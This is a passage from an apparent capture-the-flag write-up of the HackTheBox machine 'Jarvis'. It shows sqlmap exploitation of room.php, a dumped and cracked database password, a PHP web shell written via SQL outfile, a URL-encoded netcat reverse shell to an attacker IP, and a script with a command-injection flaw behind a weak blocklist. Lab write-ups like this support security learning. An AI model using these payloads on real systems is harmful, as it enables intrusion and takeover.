class="string">'</span></span><br><span class="line"><span class="string">[22:23:40] [INFO] trying to upload the file stager on '</span>/<span class="keyword">var</span>/www/html/<span class="string">' via LIMIT '</span><span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span><span class="string">' method</span></span><br><span class="line"><span class="string">[22:23:42] [INFO] the file stager has been successfully uploaded on '</span>/<span class="keyword">var</span>/www/html/<span class="string">' - http://jarvis.htb:80/tmpuujaq.php</span></span><br><span class="line"><span class="string">[22:23:43] [INFO] the backdoor has been successfully uploaded on '</span>/<span class="keyword">var</span>/www/html/<span class="string">' - http://jarvis.htb:80/tmpbtwbt.php</span></span><br><span class="line"><span class="string">[22:23:43] [INFO] calling OS shell. To quit type '</span>x<span class="string">' or '</span>q<span class="string">' and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; whoami</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] a</span></span><br><span class="line"><span class="string">command standard output: '</span>www-<span class="keyword">data</span><span class="string">'</span></span><br><span class="line"><span class="string">os-shell&gt; id</span></span><br><span class="line"><span class="string">command standard output: '</span>uid=<span class="number">33</span>(www-<span class="keyword">data</span>) gid=<span class="number">33</span>(www-<span class="keyword">data</span>) <span class="keyword">groups</span>=<span class="number">33</span>(www-<span class="keyword">data</span>)<span class="string">'</span></span><br><span class="line"><span class="string">os-shell&gt;</span></span><br></pre></td></tr></table></figure><p>From here we can simply execute a reverse shell command and get a shell. </p><h3 id="Second-way"><a href="#Second-way" class="headerlink" title="Second way:"></a>Second way:</h3><p>I used the <code>--passwords</code> option to dump the users’ password hashes:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --passwords                                  </span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . [,]     | .'| . |</span><br><span class="line">|___|_  [']_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 22:17:45 /2019-11-08/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:17:46] [INFO] resuming back-end DBMS '</span>mysql<span class="string">'</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND 9726=9726</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: cod=1 AND SLEEP(5)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-6795 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786b71,0x4149506c785a7463717746587661766f774b6655715351584358576f6c6470664f49754a6f63516b,0x717a626271),NULL-- HCXr                 </span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 9.0 (stretch)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.25</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] fetching database users password hashes</span></span><br><span class="line"><span class="string">[22:17:46] [INFO] used SQL query returns 1 entry</span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y</span></span><br><span class="line"><span class="string">[22:17:53] [INFO] writing hashes to a temporary file '</span>/tmp/sqlmapbAZ4vg2489/sqlmaphashes-KkbVkR.txt<span class="string">' </span></span><br><span class="line"><span class="string">do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n</span></span><br><span class="line"><span class="string">database management system users password hashes:</span></span><br><span class="line"><span class="string">[*] DBadmin [1]:</span></span><br><span class="line"><span class="string">    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:17:55] [INFO] fetched data logged to text files under '</span>/root/.sqlmap/<span class="keyword">output</span>/jarvis.htb<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 22:17:55 /2019-11-08/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~/Desktop/HTB/boxes/jarvis#</span></span><br></pre></td></tr></table></figure><p>I got the password hash for <code>DBadmin</code>, I cracked it with <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation</a>:<br><img src="/images/hackthebox/jarvis/10.png" alt=""><br>Then I tried these credentials (<code>DBadmin : imissyou</code>) with <code>phpmyadmin</code> and I got in:<br><img src="/images/hackthebox/jarvis/11.png" alt=""></p><p><img src="/images/hackthebox/jarvis/12.png" alt=""><br>From the <code>SQL</code> console we can write a web shell:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php system($_GET['c']); ?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"/var/www/html/sh3ll.php"</span></span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/jarvis/13.png" alt=""></p><p><img src="/images/hackthebox/jarvis/14.png" alt=""></p><p><img src="/images/hackthebox/jarvis/15.png" alt=""></p><p>I used the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd" target="_blank" rel="noopener">netcat openbsd reverse shell payload</a> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a> to get a reverse shell, I had to <code>url</code>-encode it first:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/jarvis/16.png" alt=""></p><p>Now we have a shell as <code>www-data</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1337</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1337</span><br><span class="line">Ncat: Listening on 0.0.0.0:1337</span><br><span class="line">Ncat: Connection from 10.10.10.143.</span><br><span class="line">Ncat: Connection from 10.10.10.143:57400.</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# stty raw -echo </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$ export TERM&#x3D;screen</span><br><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$</span><br></pre></td></tr></table></figure><h2 id="Command-Injection-in-simpler-py-–-gt-Shell-as-pepper-–-gt-User-Flag"><a href="#Command-Injection-in-simpler-py-–-gt-Shell-as-pepper-–-gt-User-Flag" class="headerlink" title="Command Injection in simpler.py –&gt; Shell as pepper –&gt; User Flag"></a>Command Injection in simpler.py –&gt; Shell as pepper –&gt; User Flag</h2><p>I checked the home directory and there was a user called <code>pepper</code>, I couldn’t read the user flag as <code>www-data</code>: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;var&#x2F;www&#x2F;html$ cd &#x2F;home&#x2F;</span><br><span class="line">www-data@jarvis:&#x2F;home$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root   root   4096 Mar  2  2019 .</span><br><span class="line">drwxr-xr-x 23 root   root   4096 Mar  3  2019 ..</span><br><span class="line">drwxr-xr-x  4 pepper pepper 4096 Mar  5  2019 pepper</span><br><span class="line">www-data@jarvis:&#x2F;home$ cd pepper&#x2F;</span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .</span><br><span class="line">drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..</span><br><span class="line">lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc</span><br><span class="line">drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano</span><br><span class="line">-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile</span><br><span class="line">drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web</span><br><span class="line">-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt</span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$</span><br></pre></td></tr></table></figure><p>By running <code>sudo -l</code> I saw that I can run <code>/var/www/Admin-Utilities/simpler.py</code> as <code>pepper</code> without a password:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on jarvis:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on jarvis:</span><br><span class="line">    (pepper : ALL) NOPASSWD: &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py</span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _                       </span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span><br><span class="line">&#x2F; __| | &#39;_ &#96; _ \| &#39;_ \| |&#x2F; _ \ &#39;__| &#39;_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __&#x2F; |_ | |_) | |_| |</span><br><span class="line">|___&#x2F;_|_| |_| |_| .__&#x2F;|_|\___|_(_)| .__&#x2F; \__, |</span><br><span class="line">                |_|               |_|    |___&#x2F; </span><br><span class="line">                                @ironhackers.es</span><br><span class="line">                                </span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Simpler   -   A simple simplifier ;)                 *</span><br><span class="line">* Version 1.0                                          *</span><br><span class="line">********************************************************</span><br><span class="line">Usage:  python3 simpler.py [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -h&#x2F;--help   : This help</span><br><span class="line">    -s          : Statistics</span><br><span class="line">    -l          : List the attackers IP</span><br><span class="line">    -p          : ping an attacker IP</span><br><span class="line">    </span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$</span><br></pre></td></tr></table></figure><p>Let’s take a look at that script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:/home/pepper$ cat /var/www/Admin-Utilities/simpler.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime             </span><br><span class="line"><span class="keyword">import</span> sys               </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir               </span><br><span class="line"><span class="keyword">import</span> re        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_help</span><span class="params">()</span>:</span>         </span><br><span class="line">    message=<span class="string">'''</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Simpler   -   A simple simplifier ;)                 *</span></span><br><span class="line"><span class="string">* Version 1.0                                          *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">Usage:  python3 simpler.py [options]</span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h/--help   : This help</span></span><br><span class="line"><span class="string">    -s          : Statistics</span></span><br><span class="line"><span class="string">    -l          : List the attackers IP</span></span><br><span class="line"><span class="string">    -p          : ping an attacker IP                </span></span><br><span class="line"><span class="string">    '''</span>     </span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_header</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''***********************************************</span></span><br><span class="line"><span class="string">     _                 _                       </span></span><br><span class="line"><span class="string"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span></span><br><span class="line"><span class="string">/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |</span></span><br><span class="line"><span class="string">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span></span><br><span class="line"><span class="string">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span></span><br><span class="line"><span class="string">                |_|               |_|    |___/ </span></span><br><span class="line"><span class="string">                                @ironhackers.es</span></span><br><span class="line"><span class="string">***********************************************                   </span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_statistics</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    print(<span class="string">'Statistics\n-----------'</span>)</span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    count = len(listed_files)</span><br><span class="line">    print(<span class="string">'Number of Attackers: '</span> + str(count))</span><br><span class="line">    level_1 = <span class="number">0</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    reks = []</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req = <span class="string">''</span></span><br><span class="line">    rek = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i, <span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level2, rek = get_max_level(lines)</span><br><span class="line">        fecha, requ = date_to_num(lines)</span><br><span class="line">        ip = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">            dat = fecha</span><br><span class="line">            req = requ</span><br><span class="line">            ip2 = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> int(level2) &gt; int(level_1):</span><br><span class="line">            level_1 = level2</span><br><span class="line">            ip_list = [ip]</span><br><span class="line">            reks=[rek]</span><br><span class="line">        <span class="keyword">elif</span> int(level2) == int(level_1):</span><br><span class="line">            ip_list.append(ip)</span><br><span class="line">            reks.append(rek)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Risky:'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(ip_list) &gt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'More than 1 ip found'</span>)</span><br><span class="line">    cont = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">        print(<span class="string">'    '</span> + i + <span class="string">' - Attack Level : '</span> + level_1 + <span class="string">' Request: '</span> + reks[cont])</span><br><span class="line">        cont = cont + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Recent: '</span> + ip2 + <span class="string">' --&gt; '</span> + str(dat) + <span class="string">' '</span> + req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_ip</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Attackers\n-----------'</span>)</span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i,<span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level,req = get_max_level(lines)</span><br><span class="line">        print(i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>] + <span class="string">' - Attack Level : '</span> + level)                                                                             </span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">date_to_num</span><span class="params">(lines)</span>:</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> i:</span><br><span class="line">            fecha=(i.split(<span class="string">' '</span>)[<span class="number">6</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">7</span>]).split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">            regex = <span class="string">'(\d+)-(.*)-(\d+)(.*)'</span></span><br><span class="line">            logEx=re.match(regex, fecha).groups()</span><br><span class="line">            mes = to_dict(logEx[<span class="number">1</span>])</span><br><span class="line">            fecha = logEx[<span class="number">0</span>] + <span class="string">'-'</span> + mes + <span class="string">'-'</span> + logEx[<span class="number">2</span>] + <span class="string">' '</span> + logEx[<span class="number">3</span>]</span><br><span class="line">            fecha = datetime.strptime(fecha, <span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">            <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">                dat = fecha</span><br><span class="line">                req = i.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> dat, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_dict</span><span class="params">(name)</span>:</span></span><br><span class="line">    month_dict = &#123;<span class="string">'Jan'</span>:<span class="string">'01'</span>,<span class="string">'Feb'</span>:<span class="string">'02'</span>,<span class="string">'Mar'</span>:<span class="string">'03'</span>,<span class="string">'Apr'</span>:<span class="string">'04'</span>, <span class="string">'May'</span>:<span class="string">'05'</span>, <span class="string">'Jun'</span>:<span class="string">'06'</span>,<span class="string">'Jul'</span>:<span class="string">'07'</span>,<span class="string">'Aug'</span>:<span class="string">'08'</span>,<span class="string">'Sep'</span>:<span class="string">'09'</span>,<span class="string">'Oct'</span>:<span class="string">'10'</span>,<span class="string">'Nov'</span>:<span class="string">'11'</span>,<span class="string">'Dec'</span>:<span class="string">'12'</span>&#125;                                                          </span><br><span class="line">    <span class="keyword">return</span> month_dict[name]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_level</span><span class="params">(lines)</span>:</span></span><br><span class="line">    level=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> j:</span><br><span class="line">            <span class="keyword">if</span> int(j.split(<span class="string">' '</span>)[<span class="number">4</span>]) &gt; int(level):</span><br><span class="line">                level = j.split(<span class="string">' '</span>)[<span class="number">4</span>]</span><br><span class="line">                req=j.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> level, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    show_header()</span><br><span class="line">    <span 